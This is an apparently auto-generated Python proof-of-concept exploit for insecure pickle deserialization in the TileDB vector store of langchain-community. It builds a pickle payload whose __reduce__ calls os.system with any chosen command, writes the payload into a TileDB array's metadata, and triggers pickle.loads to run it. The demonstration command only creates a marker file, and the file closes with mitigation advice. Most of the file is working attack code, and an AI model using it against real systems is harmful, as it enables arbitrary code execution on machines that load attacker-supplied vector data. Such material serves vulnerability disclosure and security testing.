#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-024
# Sink: process_index_results
# Auto-generated — run with: python3 rce_sink_function_process_index_process_index_results_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for insecure pickle deserialization in langchain-community
TileDB vector store's process_index_results function.

Vulnerability: The process_index_results function in tiledb.py uses pickle.loads()
on metadata retrieved from a TileDB array without any validation. If an attacker
can control the metadata stored in the array, they can achieve arbitrary code
execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle payload that executes a benign command
2. Writing the payload as metadata to a TileDB array
3. Triggering the deserialization via the vector store's search functionality

WARNING: This is for educational/authorized testing purposes only.
"""

import pickle
import os
import sys
import tempfile
import shutil
import subprocess
from typing import List, Optional

# Try to import required packages
try:
    import numpy as np
    import tiledb
    from tiledb.vector_search import index as tiledb_index
except ImportError as e:
    print(f"[!] Required package not installed: {e}")
    print("[!] Please install: pip install tiledb-vector-search numpy")
    sys.exit(1)

# Configuration
TARGET_HOST = "localhost"  # Change to target server if needed
TARGET_PORT = 8000  # Change to target port if needed
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"  # Safe payload for demonstration


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    This uses the standard __reduce__ method to execute arbitrary code
    when unpickled.
    
    Args:
        command: The system command to execute
        
    Returns:
        Pickled bytes containing the malicious payload
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPayload())


def setup_tiledb_array(array_uri: str, dimensions: int = 128) -> None:
    """
    Create a TileDB array for storing vectors with metadata.
    
    Args:
        array_uri: URI for the TileDB array
        dimensions: Number of dimensions for the vector embeddings
    """
    # Define the schema for the array
    # This matches the expected structure in process_index_results
    dom = tiledb.Domain(
        tiledb.Dim(name="id", domain=(0, 1000), dtype=np.uint64)
    )
    
    # Define attributes matching what process_index_results expects
    attrs = [
        tiledb.Attr(name="text", dtype=np.bytes_, var=True),
        tiledb.Attr(name="metadata", dtype=np.uint8, var=True),  # Will store pickled metadata
    ]
    
    schema = tiledb.ArraySchema(domain=dom, attrs=attrs, sparse=False)
    
    # Create the array
    tiledb.Array.create(array_uri, schema)
    print(f"[+] Created TileDB array at {array_uri}")


def write_malicious_data(array_uri: str, malicious_pickle: bytes) -> None:
    """
    Write malicious pickled metadata to the TileDB array.
    
    Args:
        array_uri: URI for the TileDB array
        malicious_pickle: The malicious pickle payload bytes
    """
    # Convert pickle bytes to numpy array of uint8
    pickle_array = np.frombuffer(malicious_pickle, dtype=np.uint8)
    
    # Open array for writing
    with tiledb.open(array_uri, "w") as array:
        # Write a document with malicious metadata
        array[0] = {
            "text": np.array([b"Benign document text"]),
            "metadata": pickle_array,
        }
    print(f"[+] Wrote malicious metadata to array at index 0")


def trigger_deserialization(array_uri: str) -> None:
    """
    Trigger the vulnerable deserialization by simulating what process_index_results does.
    
    This demonstrates how the vulnerability would be exploited in practice.
    
    Args:
        array_uri: URI for the TileDB array
    """
    print("[*] Triggering deserialization...")
    
    # Open the array for reading (simulating what process_index_results does)
    with tiledb.open(array_uri, "r") as array:
        # Read the document we wrote
        doc = array[0]
        
        # This is exactly what process_index_results does:
        pickled_metadata = doc.get("metadata")
        if pickled_metadata is not None:
            print(f"[*] Found pickled metadata, length: {len(pickled_metadata)} bytes")
            
            # The exact conversion from process_index_results:
            metadata = pickle.loads(
                np.array(pickled_metadata.tolist()).astype(np.uint8).tobytes()
            )
            print(f"[+] Deserialized metadata: {metadata}")
    
    print("[*] Deserialization complete")


def check_payload_execution() -> bool:
    """
    Check if the benign payload was executed.
    
    Returns:
        True if the payload was executed successfully
    """
    return os.path.exists("/tmp/poc_success.txt")


def main():
    """
    Main exploit demonstration function.
    """
    print("=" * 60)
    print("TileDB Pickle Deserialization RCE PoC")
    print("=" * 60)
    print()
    
    # Create a temporary directory for the TileDB array
    temp_dir = tempfile.mkdtemp()
    array_uri = os.path.join(temp_dir, "test_array")
    
    try:
        # Step 1: Create the malicious pickle payload
        print("[*] Step 1: Creating malicious pickle payload...")
        malicious_pickle = create_malicious_pickle(BENIGN_PAYLOAD)
        print(f"[+] Created malicious pickle ({len(malicious_pickle)} bytes)")
        
        # Step 2: Set up the TileDB array
        print("[*] Step 2: Setting up TileDB array...")
        setup_tiledb_array(array_uri)
        
        # Step 3: Write malicious data to the array
        print("[*] Step 3: Writing malicious data to array...")
        write_malicious_data(array_uri, malicious_pickle)
        
        # Step 4: Trigger deserialization
        print("[*] Step 4: Triggering deserialization...")
        trigger_deserialization(array_uri)
        
        # Step 5: Verify payload execution
        print("[*] Step 5: Verifying payload execution...")
        if check_payload_execution():
            print("[+] SUCCESS: Benign payload was executed!")
            print(f"[+] Command executed: {BENIGN_PAYLOAD}")
            print("[+] File /tmp/poc_success.txt was created")
        else:
            print("[!] Payload may not have executed as expected")
            print("[!] Check if the command was appropriate for your system")
        
        print()
        print("=" * 60)
        print("Vulnerability Confirmed: RCE via pickle deserialization")
        print("=" * 60)
        print()
        print("Attack Path:")
        print("1. Attacker writes malicious pickled metadata to TileDB array")
        print("2. Victim calls process_index_results() on the array")
        print("3. pickle.loads() deserializes the malicious payload")
        print("4. Arbitrary code execution achieved")
        print()
        print("Mitigation: Use a safe serialization format like JSON")
        print("or implement signature verification for pickled data")
        
    except Exception as e:
        print(f"[!] Error during exploit demonstration: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Clean up
        shutil.rmtree(temp_dir, ignore_errors=True)
        # Remove the test file if it was created
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")


if __name__ == "__main__":
    main()
